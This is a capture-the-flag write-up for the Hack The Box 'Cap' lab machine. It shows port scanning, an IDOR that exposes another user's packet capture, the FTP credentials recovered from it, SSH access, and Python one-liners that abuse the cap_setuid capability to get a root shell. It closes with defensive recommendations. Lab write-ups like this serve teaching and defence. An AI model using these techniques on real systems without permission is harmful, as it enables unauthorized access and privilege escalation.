# HTB - Cap

**IP Address:** `10.10.10.245`  
**OS:** Ubuntu 20.04  
**Difficulty:** Easy  
**Tags:** #FTP, #PCAP, #Wireshark, #SSH, #LinPEAS, #SUID, #Python, #IDOR

---
## Synopsis

Cap is an easy Linux machine running a web-based "Security Dashboard" that allows users to perform network captures.  
An **Insecure Direct Object Reference (IDOR)** vulnerability grants access to another user's packet capture containing plaintext credentials.  
These credentials are reused for SSH access.  
Privilege escalation is achieved by abusing the `cap_setuid` Linux capability assigned to Python, allowing direct privilege switching to root.

---
## Skills Required

- Basic web enumeration
- Familiarity with Wireshark and PCAP analysis
- Understanding of Linux capabilities

## Skills Learned

- Identifying and exploiting **IDOR** vulnerabilities
- Analyzing packet captures for credentials
- Leveraging Linux capabilities (`cap_setuid`) for privilege escalation

---
## 1. Initial Enumeration

### 1.1 Connectivity Test

Verify if the host is alive using ICMP:

```bash
ping -c 1 10.10.10.245
```

![ping](GitHubv2/HackTheBox/EASY/Cap/screenshots/ping.png)

The host responds, confirming it is reachable.

---
### 1.2 Port Scanning

Scan all TCP ports to identify running services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.245 -oG allPorts
```

- `-p-`: Scan all 65,535 ports  
- `--open`: Show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: Increase speed  
- `-Pn`: Skip host discovery (already confirmed alive)  
- `-oG`: Output in grepable format

![nmap](GitHubv2/HackTheBox/EASY/Cap/screenshots/nmap.png)

Extract open ports from the result:

```bash
extractPorts allPorts
```

![extractPorts](GitHubv2/HackTheBox/EASY/Cap/screenshots/extractPorts.png)

---
### 1.3 Targeted Scan

Run a deeper scan with service/version detection and default scripts:

```bash
nmap -sCV -p21,22,80 10.10.10.245 -oN targeted
```

- `-sC`: Run default NSE scripts  
- `-sV`: Detect service versions  
- `-oN`: Output in human-readable format  

Let's check the result:

```bash
cat targeted -l java
```

![targeted](GitHubv2/HackTheBox/EASY/Legacy/screenshots/targeted.png)

**Findings:**

| Port | Service | Version                  |
|------|---------|--------------------------|
| 21   | FTP     | vsftpd (anonymous login disabled) |
| 22   | SSH     | OpenSSH 8.x               |
| 80   | HTTP    | Gunicorn Python WSGI server |

---
## 2. Web Enumeration

### 2.1 Dashboard Overview

Browsing to `http://10.10.10.245`, after saving it into `/etc/hosts`, reveals a **Security Dashboard** already logged in as user `Nathan`.

![dashboard](GitHubv2/HackTheBox/EASY/Cap/screenshots/dashboard.png)

Menu options include:

![dashboard_left_menu](GitHubv2/HackTheBox/EASY/Cap/screenshots/dashboard_left_menu.png)

- **IP Config** → Displays output of `ifconfig`  
- **Network Status** → Displays output of `netstat`  
- **Security Snapshot** → Generates a downloadable packet capture

---
### 2.2 Capture Analysis & IDOR Discovery

When generating a capture, the URL changes to:

```
/capture/data/1
```

![dashboard_data_1](GitHubv2/HackTheBox/EASY/Cap/screenshots/dashboard_data_1.png)

This suggests the capture ID is sequential.  
Testing `/capture/data/0` successfully downloads a previous capture.

![dashboard_data_0](GitHubv2/HackTheBox/EASY/Cap/screenshots/dashboard_data_0.png)

> **Vulnerability:**  
> This is an **Insecure Direct Object Reference (IDOR)** — direct access to objects by modifying identifiers in the request.

---
### 2.3 Credential Extraction from PCAP

The capture file from `/capture/data/0` is downloaded, opened in **Wireshark** and filtered for FTP traffic:

```
ftp
```

![wireshark](GitHubv2/HackTheBox/EASY/Cap/screenshots/wireshark.png)

Captured credentials:

```
Username: nathan
Password: Buck3tH4TF0RM3!
```

---
## 3. Foothold

### 3.1 SSH Access

Use the recovered credentials to log in via SSH:

```bash
ssh nathan@10.10.10.245
```

![user_flag](GitHubv2/HackTheBox/EASY/Cap/screenshots/user_flag.png)

✅ **SSH login successful**  
🏁 **User flag retrieved from Nathan's home directory**

---
## 4. Privilege Escalation

### 4.1 Checking SUID binaries

After obtaining the user flag, we start privilege escalation by checking for SUID binaries owned by root:

```bash
find / -perm -4000 -user root 2>/dev/null | xargs ls -l
```

![root_permisions](GitHubv2/HackTheBox/EASY/Cap/screenshots/root_permisions.png)

No exploitable SUID binaries are found.

---
### 4.2 Checking capabilities

Next, we enumerate all file capabilities for user `nathan`:

```bash
getcap -r / 2>/dev/null
```

![getcap_devnull](GitHubv2/HackTheBox/EASY/Cap/screenshots/getcap_devnull.png)

Finding:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+ep
```

---
### 4.3 Exploiting `cap_setuid`

The `CAP_SETUID` capability allows a process to change its UID without needing the SUID bit.  

First, verify that Python executes commands as our current user:

```bash
python3.8 -c 'import os; os.system("whoami")'
```
Output:
```
nathan
```

Then, change the UID to `0` (root) and check again:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("whoami")'
```
Output:
```
root
```

Finally, spawn a root shell:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("bash")'
```

![setuid_0](GitHubv2/HackTheBox/EASY/Cap/screenshots/setuid_0.png)

🏁 **Root flag retrieved from `/root`**

---
# ✅ MACHINE COMPLETE

---
## Summary of Exploitation Path

1. **Web Enumeration** → Discovered capture generation feature.  
2. **IDOR** → Accessed another user’s PCAP file.  
3. **PCAP Analysis** → Extracted plaintext FTP credentials.  
4. **SSH Access** → Logged in as Nathan.  
5. **Privilege Escalation** → Abused Python `cap_setuid` to gain root.

---
## Defensive Recommendations

- Implement proper **access control** to prevent IDOR vulnerabilities.  
- Avoid storing or transmitting credentials in plaintext (use FTPS/SFTP).  
- Restrict Linux capabilities to only required binaries.  
- Regularly audit server configurations for misconfigurations.

